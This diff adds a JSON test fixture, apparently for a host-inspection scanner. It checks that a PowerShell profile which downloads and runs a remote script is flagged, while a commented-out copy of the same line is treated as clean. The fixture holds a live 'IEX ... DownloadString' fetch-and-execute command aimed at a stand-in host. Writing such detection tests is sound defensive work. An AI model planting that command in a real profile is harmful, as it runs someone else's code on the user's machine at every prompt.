@@ -1,0 +1,36 @@
+{
+  "why": "A PowerShell profile runs in every new PowerShell window. One that downloads a script and executes it is somebody else's code at every prompt, and nobody writes that line by accident. The same line commented out runs nothing and is clean.",
+  "roots": [
+    "code"
+  ],
+  "files": {
+    "code/proj/src/index.js": "export const hello = () => 'world'\n"
+  },
+  "home": {
+    "Documents/PowerShell/Microsoft.PowerShell_profile.ps1": "Set-Alias ll ls\nIEX (New-Object Net.WebClient).DownloadString('http://example.test/a')\n",
+    "Documents/WindowsPowerShell/profile.ps1": "# iex (irm http://example.test/install.ps1)\nSet-Alias g git\n"
+  },
+  "host": {
+    "platform": "windows\n",
+    "processes": "",
+    "connections": "",
+    "git-config": "",
+    "root/.keep": "",
+    "run-keys": "",
+    "scheduled-tasks": ""
+  },
+  "expect": {
+    "exit": 2,
+    "findings": [
+      {
+        "level": "HIT",
+        "match": "PowerShell profile downloads and executes code",
+        "path": "Documents/PowerShell/Microsoft.PowerShell_profile.ps1"
+      },
+      {
+        "level": "ok",
+        "match": "WindowsPowerShell/profile.ps1"
+      }
+    ]
+  }
+}
